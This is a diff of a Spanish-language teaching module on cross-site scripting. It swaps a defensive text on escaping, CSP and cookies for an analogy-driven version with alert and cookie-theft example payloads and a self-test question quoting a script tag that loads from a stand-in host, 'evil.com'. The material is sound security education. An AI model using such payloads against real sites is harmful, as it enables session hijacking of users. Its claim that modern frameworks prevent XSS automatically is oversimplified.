@@ -1,180 +1,79 @@
-# Cross-Site Scripting
+# XSS (Cross-Site Scripting): El Parásito del Navegador
 
-## Objetivo
+## Objetivo del Módulo
 
-Entender XSS, por que ocurre y como prevenirlo.
+Entender por qué el navegador del usuario (Chrome, Safari) es el eslabón más débil de la cadena, y cómo un atacante puede ejecutar código malicioso en tu computadora sin enviarte ningún archivo virus `.exe`.
 
-XSS es una falla de confianza entre datos no confiables y el navegador. La clave no es memorizar payloads; es entender en que contexto se renderiza un dato y como evitar que se interprete como código.
+A diferencia de la Inyección SQL, donde el atacante destruye el servidor trasero (El Cocinero), en **XSS (Cross-Site Scripting)** al hacker no le importa el servidor. El hacker usa la página web legítima como un simple vehículo para atacar directamente al cliente (La Mesa).
 
-## Qué es
+---
 
-XSS ocurre cuando una aplicación permite que contenido no confiable se ejecute como JavaScript en el navegador de otros usuarios.
+## 1. La Analogía: El Dardo Envenenado en la Carta
 
-## Modelo Mental
+Imagina que el Servidor (Backend) es un cartero. Su único trabajo es tomar cartas (comentarios, mensajes, perfiles) de un usuario y entregárselas a otro usuario. El cartero es un robot eficiente: no lee las cartas, solo las entrega.
 
-```text
-input no confiable -> almacenamiento/procesamiento -> render en navegador -> ejecucion
-```
+1. El Atacante escribe una carta (un comentario en un blog). Pero adentro de la carta, pega con cinta adhesiva un **Dardo Envenenado** con un resorte. Se la da al cartero.
+2. El cartero toma la carta y la guarda en la base de datos de comentarios.
+3. Al día siguiente, la **Víctima** entra a leer el blog.
+4. El cartero (Servidor) le entrega la carta a la Víctima.
+5. La Víctima (El navegador Chrome) abre la carta. ¡PUM! El resorte salta, el dardo envenenado se le clava en la cara a la víctima. 
 
-Si el dato llega al DOM como código ejecutable, hay riesgo.
+**¿De quién es la culpa?** 
+Del cartero (El Servidor / Programador), por no haber revisado la carta (Filtrar / Sanitizar) y quitarle las armas antes de entregársela al siguiente usuario.
 
-## Tipos
+---
 
-### Reflected XSS
+## 2. El Código (El Dardo de JavaScript)
 
-La entrada aparece inmediatamente en la respuesta.
+El "Dardo Envenenado" en la vida real es un pedazo de código escrito en **JavaScript**.
+Los navegadores están programados para obedecer ciegamente cualquier cosa que esté encerrada entre las etiquetas `<script>` y `</script>`.
 
-Ejemplo conceptual:
+Si el foro de tu escuela te pregunta: *"¿Cuál es tu nombre?"*, un usuario normal escribe `Juan`.
+Un Hacker escribe:
+`<script> alert("Felicidades, te ganaste un iPhone"); </script>`
 
-```text
-/search?q=texto
-```
+Si el programador fue perezoso y guardó ese texto crudo en la base de datos, cada vez que alguien visite el perfil del hacker, el navegador de la víctima no verá la palabra "script", simplemente ejecutará la orden y le sacará una ventana molesta de un iPhone falso.
 
-Si `q` se refleja sin escape, puede ser peligroso.
+### Más allá de la Molestia (Robo de Sesión)
+Sacar ventanas emergentes (`alert`) es divertido, pero un hacker real hace esto de forma invisible:
+`<script> enviar_a_rusia( document.cookie ); </script>`
 
-### Stored XSS
+Ese pequeño comando toma tu **Cookie de Sesión** (El post-it mágico que le dice al servidor quién eres) y se la envía al servidor remoto del hacker. El atacante ahora es dueño de tu cuenta de Facebook o de tu Banco, y tú nunca te diste cuenta porque la página pareció cargar normalmente.
 
-El payload queda guardado en la aplicación.
+---
 
-Ejemplos:
+## 3. Tipos de XSS
 
-- Comentarios.
-- Perfil.
-- Mensajes.
+1.  **XSS Reflejado (El Espejo):** El código malicioso va escondido en un Link que el hacker te envía por WhatsApp. Cuando das clic, la página del banco se abre, el servidor del banco "refleja" el ataque de vuelta a tu pantalla, y te roban. El código malicioso nunca se guardó en la base de datos.
+2.  **XSS Almacenado (La Bomba de Tiempo):** El peor de todos (El ejemplo de la carta). El hacker guarda el comentario malicioso en la base de datos del servidor (ej. Un video de YouTube). Un millón de personas entran a ver el video, y el millón de personas se infectan automáticamente.
+3.  **XSS Basado en DOM:** El ataque ocurre enteramente dentro del código Frontend de tu navegador. El cartero (Servidor) nunca llegó a ver el dardo.
 
-### DOM XSS
+---
 
-La falla ocurre por JavaScript del cliente que procesa datos inseguros.
+## 4. La Defensa (El Blue Team)
 
-Ejemplos de fuentes en DOM:
+Prevenir el XSS es una de las tareas más repetitivas de un programador.
 
-- `location.hash`;
-- `location.search`;
-- `document.referrer`;
-- Mensajes entre ventanas;
-- Respuestas de APIs renderizadas con `innerHTML`.
+**La Regla de Oro: Sanitización y Codificación (Encoding).**
 
-## Impacto
+Cuando el cartero revisa la carta, debe confiscar las armas. En la web, las armas son los símbolos mayor que y menor que (`<` y `>`).
+El programador usa funciones que convierten los símbolos peligrosos en texto inofensivo de HTML.
+*   El `<` se convierte en `&lt;` (Less Than).
+*   El `>` se convierte en `&gt;` (Greater Than).
 
-Puede permitir:
+Cuando el hacker intenta inyectar `<script>`, la base de datos guarda `&lt;script&gt;`.
+Cuando el navegador de la víctima lee la página, en lugar de *ejecutar* un virus, simplemente dibuja las letras "<script>" en la pantalla como si fuera texto normal y aburrido. El dardo fue desactivado.
 
-- Robo de información visible en la página.
-- Acciones en nombre del usuario.
-- Manipulacion de contenido.
-- Redireccion a phishing.
-- Robo de tokens si están mal protegidos.
+> **Importante:**
+> Los frameworks modernos de Frontend (React, Angular, Vue) **te protegen del XSS de forma automática**. Sanitizan todo el texto por defecto. Por eso, si ves un ataque de XSS exitoso hoy en día, casi siempre es en páginas viejas, mal diseñadas, o donde el programador usó la función altamente prohibida `dangerouslySetInnerHTML`.
 
-## Mitigacion
+---
 
-- Escapar salida según contexto.
-- Sanitizar HTML cuando se permita HTML.
-- Usar frameworks correctamente.
-- Content Security Policy.
-- Cookies `HttpOnly` y `Secure`.
-- Validación de entrada como control adicional, no unico.
+## 5. Criterio de Dominio (Autoevaluación)
 
-## Escape por Contexto
+Revisa si puedes detectar el veneno:
 
-No existe un solo escape universal. Depende de donde se imprime el dato.
-
-| Contexto | Riesgo | Control |
-| --- | --- | --- |
-| HTML body | Interpretar etiquetas | HTML escaping |
-| Atributo HTML | Romper atributo | Attribute escaping |
-| JavaScript | Ejecutar código | Evitar inline JS, serializar seguro |
-| URL | Redireccion o esquema peligroso | Validar esquema y destino |
-| CSS | Inyección de estilos | Evitar CSS dinamico no confiable |
-
-## Contextos
-
-El escape depende del lugar:
-
-- HTML.
-- Atributo HTML.
-- JavaScript.
-- URL.
-- CSS.
-
-Escapar mal puede dejar bypasses.
-
-## Content Security Policy
-
-CSP reduce impacto si algo falla, pero no reemplaza escape ni sanitizacion.
-
-Buenas ideas:
-
-- Evitar `unsafe-inline`;
-- Restringir origenes de scripts;
-- Usar nonces o hashes cuando aplique;
-- Reportar violaciones;
-- Probar que no rompa la app.
-
-## Cookies y Sesiones
-
-`HttpOnly` ayuda porque impide que JavaScript lea la cookie. No evita todas las acciones en nombre del usuario, pero reduce robo directo de tokens.
-
-`SameSite` ayuda contra ciertos flujos cross-site.
-
-`Secure` exige HTTPS.
-
-## Señales de Alerta
-
-- Parametros reflejados.
-- Campos de comentario sin sanitizar.
-- HTML permitido sin controles.
-- JavaScript que usa `innerHTML` con datos no confiables.
-
-En código frontend, revisa:
-
-- `innerHTML`;
-- `dangerouslySetInnerHTML`;
-- Templates manuales;
-- Render de Markdown/HTML;
-- Valores de URL insertados en DOM;
-- Librerías de sanitizacion mal configuradas.
-
-## Observación Segura
-
-XSS debe estudiarse en laboratorios autorizados o aplicaciones propias. La idea es entender el flujo, no lanzar payloads contra sistemas ajenos.
-
-Para analizar un caso de XSS, separa:
-
-- Entrada: donde llega el dato no confiable;
-- Almacenamiento: si se guarda o solo se refleja;
-- Salida: donde se renderiza;
-- Contexto: HTML, atributo, JavaScript, URL o CSS;
-- Impacto: que podria hacer un atacante;
-- Control: escape, sanitizacion, CSP y cookies seguras;
-- Detección: logs y señales sin guardar payloads peligrosos completos si no hace falta.
-
-## Criterios de Revisión
-
-Una revisión defensiva busca comprobar si:
-
-- Los datos no confiables se escapan según contexto;
-- El HTML permitido pasa por sanitizador confiable;
-- No se usa `innerHTML` con datos no confiables;
-- Cookies sensibles usan `HttpOnly`;
-- Cookies sensibles usan `Secure`;
-- Cookies sensibles usan `SameSite`;
-- CSP está definida como capa adicional;
-- Inputs se validan, aunque no sean la defensa principal;
-- Logs registran intentos sospechosos sin crear nuevos riesgos.
-
-## Errores Comunes
-
-- Creer que validar input elimina todo XSS.
-- Escapar para HTML cuando el contexto era JavaScript.
-- Permitir Markdown/HTML sin sanitizar.
-- Confiar en CSP como unica defensa.
-- Ignorar DOM XSS porque "el backend es seguro".
-
-## Criterio de Dominio
-
-Puedes avanzar cuando puedas:
-
-- Diferenciar reflected, stored y DOM XSS.
-- Explicar escape por contexto.
-- Explicar CSP a nivel básico.
-- Explicar por que `HttpOnly` ayuda.
-- Revisar un flujo y proponer controles especificos por contexto.
+1. ¿Por qué en un ataque de Inyección SQL la víctima es el Servidor de la empresa, mientras que en un ataque de XSS la víctima es el Cliente (el usuario de la página)?
+2. Encuentras un XSS Reflejado en la página de un Banco. Le mandas el link malicioso a una víctima por correo. ¿Qué archivo temporal crítico de su navegador web estás intentando robar mediante tu código de JavaScript?
+3. Como Analista de SOC, ves que un usuario llamado "Pepe" subió una foto de perfil, pero en lugar del nombre de su foto, escribió `<script src="http://evil.com/virus.js"></script>`. ¿Qué tipo exacto de XSS está intentando ejecutar si su objetivo es infectar a todos los que visiten su perfil mañana?
+4. El desarrollador Frontend te dice: *"No te preocupes por el XSS, yo escribí un código que bloquea la palabra específica `<script>`"*. ¿Por qué esto es una defensa inútil? *(Pista: Piensa en otras etiquetas HTML que pueden cargar imágenes o enlaces y ejecutar eventos de error).*
